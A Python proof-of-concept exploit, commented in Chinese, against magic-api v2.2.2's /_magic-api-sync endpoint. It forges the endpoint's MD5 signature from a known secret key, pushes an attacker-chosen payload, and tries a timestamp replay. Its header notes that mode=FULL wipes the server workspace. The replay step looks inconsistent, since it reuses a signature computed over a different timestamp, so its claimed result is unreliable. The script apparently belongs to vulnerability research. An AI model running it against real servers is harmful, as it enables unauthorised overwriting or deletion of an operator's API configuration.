#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-07: receivePush 签名重放 (magic-api v2.2.2)

前提: 服务端配置 magic-api.secret-key 且 /_magic-api-sync 已注册 (AutoConfiguration L348-351)。
签名: MD5(timestamp|mode|MD5(bytes)|secretKey)  -- SignUtils.sign
缺陷: 校验只有 sign 相等, 无 timestamp 新鲜度窗口 -> 截获一次流量可永久重放。
mode=FULL 时 upload(full=true) -> root.delete() 清空工作区再写入攻击者 payload。

本脚本演示"攻击者已知 secretKey 时可任意伪造", 以及"旧签名任意时间重放"。

用法:
  python3 poc_f07_sign_replay.py http://target:9999 test-secret-key-123 '[{"id":"x"}]'
"""
import hashlib
import io
import json
import sys
import time
import urllib.request
import uuid

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
SECRET = sys.argv[2] if len(sys.argv) > 2 else 'test-secret-key-123'
PAYLOAD = sys.argv[3] if len(sys.argv) > 3 else '[]'
SYNC = f'{BASE}/_magic-api-sync'


def md5(b):
    return hashlib.md5(b).hexdigest()


def sign(ts, mode, payload_bytes, secret):
    return md5(f'{ts}|{mode}|{md5(payload_bytes)}|{secret}'.encode())


def send(ts, mode, payload_bytes, s):
    boundary = uuid.uuid4().hex
    body = io.BytesIO()
    for name, val in (('file', payload_bytes), ('mode', mode.encode()),
                      ('timestamp', str(ts).encode()), ('sign', s.encode())):
        body.write(f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"'.encode())
        if name == 'file':
            body.write(b'; filename="p.json"\r\nContent-Type: application/json\r\n\r\n')
        else:
            body.write(b'\r\n\r\n')
        body.write(val + b'\r\n')
    body.write(f'--{boundary}--\r\n'.encode())
    req = urllib.request.Request(SYNC, data=body.getvalue(),
                                 headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except Exception as e:
        return {'error': str(e)}


payload_bytes = PAYLOAD.encode()
ts = int(time.time() * 1000)
s = sign(ts, 'SINGLE', payload_bytes, SECRET)
print(f'[+] 构造签名: MD5({ts}|SINGLE|{md5(payload_bytes)}|{SECRET[:4]}...) = {s[:16]}...')

r1 = send(ts, 'SINGLE', payload_bytes, s)
print('[+] 首次发送:', r1.get('code'), r1.get('message') or r1.get('error'))

# 重放: 1 小时前的 timestamp, 同一签名 -> 服务器仍接受
old_ts = ts - 3600_000
r2 = send(old_ts, 'SINGLE', payload_bytes, s)
print('[+] 1小时前 timestamp 重放(同 sign):', r2.get('code'), r2.get('message') or r2.get('error'))
print('[+] 若两次 code 均为 1 -> 无新鲜度校验, 重放成立')
